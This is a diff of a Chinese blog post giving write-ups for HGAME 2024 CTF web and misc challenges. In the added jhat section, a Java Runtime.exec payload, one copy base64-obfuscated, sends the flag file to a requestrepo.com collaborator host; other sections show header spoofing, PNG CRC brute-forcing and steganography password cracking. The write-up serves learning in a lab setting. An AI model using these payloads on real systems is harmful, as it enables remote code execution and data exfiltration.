@@ -339,14 +339,14 @@ BP上添加即可
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-02-06
+                    2024-02-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    2.4k
                 </div>
                 
 
@@ -363,9 +363,6 @@ BP上添加即可
         <hr class="clearfix">
 
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
 
         
 
@@ -373,16 +370,16 @@ BP上添加即可
             <div id="articleContent">
                 <h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052052820.png"></p>
 <p>刚打开可以看到这些文字，这一步考取的应该是<code>Referer</code>头</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">可构造 Referer: vidar.club<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">可构造 Referer: vidar.club<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>BP上添加即可</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052106907.png"></p>
 <p>这波应该是需要我们修改访问此网站浏览器信息，即<code>User-Agent</code></p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">可构造 User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">可构造 User-Agent: Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36 Edg&#x2F;121.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052106077.png"></p>
 <p>ok，这波通过文字描述可以得知要考取的是<code>X-Forwarded-For</code>头，但是本题如果仅使用这个头是没法得到结果的，这里用到了<code>fake ip</code>，这边BP是有插件的。</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">可构造
+<pre class="line-numbers language-none"><code class="language-none">可构造
 X-Forwarded:127.0.0.1
 Forwarded-For:127.0.0.1
 Forwarded:127.0.0.1
@@ -425,6 +422,74 @@ Fastly-Client-Ip:127.0.0.1
 <p>可能攻击显示没有选取成功，可以放到其他浏览器或者放包看其实已经成功了</p>
 <p>然后全部选上后可以点击选完了拿到flag</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402052152665.png"></p>
+<h4 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h4><p>打开是一个2048的小游戏，不过*16，那么就不指望挑战了，看看能不能从<code>js</code>源码里面找到解决办法，但他这个源码进行了JS混淆，从里面可以找到这俩个可疑字符串</p>
+<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081742781.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">I7R8ITMCnzbCn5eFIC&#x3D;6yliXfzN&#x3D;I5NMnz0XIC&#x3D;&#x3D;yzycysi70ci7y7iK<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081743216.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">V+g5LpoEej&#x2F;fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl&#x3D;QcTq6JkWK4t3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现第二个字符串是<code>[a-z,0-9,A-Z]+/=</code>，很像base的组成啊(当时我是真没想到这玩意是base换表啊)，放到cyberchef去换表一下，拿到flag</p>
+<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081745576.png"></p>
+<h4 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h4><blockquote>
+<p>题目描述                                                                                                                                                                            jhat is a tool used for analyzing Java heap dump files</p>
+<p><strong>提示1</strong>hint1: need rce</p>
+<p><strong>提示2</strong>hint2: focus on oql</p>
+<p><strong>提示3</strong>hint3: 题目不出网 想办法拿到执行结果</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">jhat(解析Java堆转储文件)
+jhat命令解析Java堆转储文件，可以将堆中的对象以html的形式显示出来，包括对象的数量、大小等等。 jhat命令支持预先设计的查询，例如，显示一个已知类MyClass的所有实例，以及对象查询语言 (OQL)。 本命令在以后的版本中可能不再支持。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>我们还可以从本题中拿到一个附件，附件内容如下</p>
+<pre class="line-numbers language-none"><code class="language-none">FROM openjdk:8
+COPY data &#x2F;
+CMD jhat heapdump.hprof
+EXPOSE 7000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&#96;FROM openjdk:8&#96;: 这一行指定了基础镜像，即在构建这个镜像时所使用的基础环境。在这里，使用的是名为 &#96;openjdk&#96;，版本为 &#96;8&#96; 的镜像。
+&#96;COPY data &#x2F;&#96;: 这一行指示 Docker 在构建镜像时将当前目录中的 &#96;data&#96; 目录中的所有内容复制到镜像中的根目录(&#96;&#x2F;&#96;)中。这样，&#96;data&#96; 目录中的所有文件和子目录都会被复制到镜像中。
+&#96;CMD jhat heapdump.hprof&#96;: 这行指定了容器启动时要执行的默认命令。在这里，&#96;CMD&#96; 指定了运行 &#96;jhat heapdump.hprof&#96; 命令。这个命令通常用于分析 Java 应用程序的堆转储文件(&#96;heapdump.hprof&#96;)。在容器启动时，会执行这个命令来启动 &#96;jhat&#96; 工具，并将 &#96;heapdump.hprof&#96; 文件作为输入。
+&#96;EXPOSE 7000&#96;: 这行指定了容器内部的端口映射，将容器内部的 &#96;7000&#96; 端口暴露给外部。这意味着容器内运行的应用程序可以通过外部访问其运行在 &#96;7000&#96; 端口上的服务。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这题就是照佬复现了，佬博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/136051411">HGAME 2024 WEEK1 Web方向题解 全-CSDN博客</a></p>
+<p>第一个解决办法是利用信道了<a target="_blank" rel="noopener" href="https://requestrepo.com/">Dashboard - requestrepo.com</a>，通过信道可以将flag数据带出。</p>
+<pre class="line-numbers language-none"><code class="language-none">java.lang.Runtime.getRuntime().exec(&#39;curl -X POST --data hello aybyrecq.requestrepo.com&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>通过网站可以发现是有回显的</p>
+<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081756180.png"></p>
+<p>那么再通过构造<code>bash -c &quot;命令&quot;</code>。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'bash -c &#123;echo,Y3VybCAgaHR0cDovL2BjYXQgL2ZsYWdgLmF5YnlyZWNxLnJlcXVlc3RyZXBvLmNvbQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>通过使用<code>base64</code>解码后执行。这种方法可以绕过了直接在<code>exec</code>方法中使用Shell特性的限制。</p>
+<p>编码获取</p>
+<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081759288.png"></p>
+<p>可以发现通过此命令已经将flag带出来了</p>
+<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081800235.png"></p>
+<p>不过在佬博客里面说，由于此题是不出网的，所以上面这种方法也是非预期，真正的预期解是如下的代码</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> process <span class="token operator">=</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> inputStream <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> result <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> scanner<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
+result<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>通过此代码可以拿到完整的flag</p>
+<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402081803845.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">&#96;var process &#x3D; java.lang.Runtime.getRuntime().exec(&quot;cat &#x2F;flag&quot;);&#96;：
+  - 这行代码创建了一个 &#96;process&#96; 变量，它调用了 Java 运行时的 &#96;exec&#96; 方法，用于执行系统命令。
+  - 在这里，命令是 &#96;cat &#x2F;flag&#96;，表示要执行 &#96;cat&#96; 命令来读取 &#96;&#x2F;flag&#96; 文件的内容。
+&#96;var inputStream &#x3D; process.getInputStream();&#96;：
+  - 这行代码获取了 &#96;process&#96; 对象的输入流，以便读取命令执行的结果。
+&#96;var scanner &#x3D; new java.util.Scanner(inputStream).useDelimiter(&quot;\\A&quot;);&#96;：
+  - 这行代码创建了一个 &#96;scanner&#96; 对象，用于扫描输入流中的内容。
+  - &#96;java.util.Scanner&#96; 是用于扫描输入的工具类。
+  - &#96;.useDelimiter(&quot;\\A&quot;)&#96; 表示使用 &#96;\A&#96; 作为分隔符，&#96;\A&#96; 表示输入的开头。
+&#96;var result &#x3D; scanner.hasNext() ? scanner.next() : &quot;&quot;;&#96;：
+  - 这行代码检查扫描器是否有下一行输入，如果有，则将其读取为字符串赋给 &#96;result&#96; 变量；否则，将 &#96;result&#96; 设为空字符串。
+&#96;result;&#96;：
+  - 这行代码输出 &#96;result&#96; 变量的值，即命令执行的结果。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061213764.png"></p>
 <p>很显然，flag就在图片里，将图片存到手机上，然后从充电口看就能拿到flag了。</p>
 <h4 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a>simple_attack</h4><p>第一个压缩包内容图片</p>
@@ -444,23 +509,23 @@ Fastly-Client-Ip:127.0.0.1
 <h4 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h4><p>下载文件是一个待修复的图片，拿到010进行修复一下，修复之前我们可以拉到最底下发现在该图片下有着一个压缩包</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061235501.png"></p>
 <p>通过脚本可以爆破出图片的宽高</p>
-<pre class="line-numbers language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> binascii
-<span class="keyword">import</span> struct
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">import binascii
+import struct
 
-crcbp = <span class="built_in">open</span>(<span class="string">"C://Users//DDD//Desktop//secret.png"</span>, <span class="string">"rb"</span>).read()  <span class="comment"># 打开图片</span>
-crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(), <span class="number">16</span>)  <span class="comment"># 读取图片中的CRC校验值</span>
-<span class="built_in">print</span>(crc32frombp)
+crcbp &#x3D; open(&quot;C:&#x2F;&#x2F;Users&#x2F;&#x2F;DDD&#x2F;&#x2F;Desktop&#x2F;&#x2F;secret.png&quot;, &quot;rb&quot;).read()  # 打开图片
+crc32frombp &#x3D; int(crcbp[29:33].hex(), 16)  # 读取图片中的CRC校验值
+print(crc32frombp)
 
-<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):  <span class="comment"># 宽度1-4000进行枚举</span>
-    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):  <span class="comment"># 高度1-4000进行枚举</span>
-        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \
-               struct.pack(<span class="string">&#x27;>i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;>i&#x27;</span>, j) + crcbp[<span class="number">24</span>:<span class="number">29</span>]
-        crc32 = binascii.crc32(data) & <span class="number">0xffffffff</span>
-        <span class="comment"># print(crc32)</span>
-        <span class="keyword">if</span> (crc32 == crc32frombp):  <span class="comment"># 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span>
-            <span class="built_in">print</span>(i, j)
-            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))
-            exit(<span class="number">0</span>)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+for i in range(4000):  # 宽度1-4000进行枚举
+    for j in range(4000):  # 高度1-4000进行枚举
+        data &#x3D; crcbp[12:16] + \
+               struct.pack(&#39;&gt;i&#39;, i) + struct.pack(&#39;&gt;i&#39;, j) + crcbp[24:29]
+        crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff
+        # print(crc32)
+        if (crc32 &#x3D;&#x3D; crc32frombp):  # 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定
+            print(i, j)
+            print(&#39;hex:&#39;, hex(i), hex(j))
+            exit(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061237815.png"></p>
 <p>将其改到010中就可以拿到真正的图片</p>
@@ -469,16 +534,16 @@ crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</s
 <p>可以发现其中隐藏的密钥</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061239531.png"></p>
 <p>再结合题目所示，希尔密码<a target="_blank" rel="noopener" href="http://www.metools.info/code/hillcipher243.html">希尔密码(Hill Cipher)加密解密-ME2在线工具 (metools.info)</a>，加上这个密钥可以拿到flag，至于密文，我们甚至可以不去分解，直接从010拿到密文（但最好是去分一下）</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">CVOCRJGMKLDJGBQIUIVXHEYLPNWR<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">CVOCRJGMKLDJGBQIUIVXHEYLPNWR<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>解密后，用hgame{}包裹即可</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061242300.png"></p>
 <h4 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h4><p>打开是一个jpg图片，结合本题提示密码是6位弱密码，本题的考点是<code>steghide</code>和<code>stegseek</code>的利用，不过用<code>stegseek</code>可以直接拿到隐藏的内容</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">time stegseek 解密文件 字典<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">time stegseek 解密文件 字典<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061247503.png"></p>
 <p>至于字典的获取，可以从网上了解一下，kali也自带一个字典可以下载。然后可以找到本题的密码是123456，不过用<code>steghide</code>也是可以的。</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">steghide extract -sf 解密文件 -p 123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">steghide extract -sf 解密文件 -p 123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>解密后可以拿到一个图片</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402061250502.png"></p>
@@ -733,9 +798,6 @@ crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</s
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
